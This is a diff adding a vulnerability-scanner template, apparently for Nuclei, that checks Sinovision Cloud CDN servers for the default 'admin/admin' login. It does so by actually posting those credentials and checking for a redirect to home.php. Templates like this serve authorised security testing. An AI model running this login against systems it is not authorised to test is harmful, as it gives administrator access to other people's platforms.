@@ -1,0 +1,60 @@
+id: sinovision-cloud-cdn-default-password
+info:
+  name: Sinovision Cloud CDN Default Password
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    The Sinovision Cloud CDN live broadcast acceleration server has a default password vulnerability. Attackers can use the default credentials 'admin/admin' to log in to the system and gain administrator privileges, leading to potential control over the entire platform.
+  tags: default-password
+  classification:
+    cvss-score: 6.5
+    cve-id: []
+    cwe-id: []
+  reference:
+    - https://www.cnvd.org.cn/flaw/show/CNVD-2021-41015
+
+variables:
+  cookie: ""
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: get-login-page
+    method: GET
+    path:
+      - "/newlive/manager/index.php"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: cookie
+        part: header
+        regex:
+          - "Set-Cookie: (.*?);"
+        internal: true
+
+  - id: attempt-login
+    method: POST
+    path:
+      - "/newlive/manager/login.php"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
+      Content-Type: application/x-www-form-urlencoded
+      Connection: close
+      Cookie: "{{cookie}}"
+    body: "Name=admin&Pass=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
+      - type: word
+        part: header
+        words:
+          - "home.php"
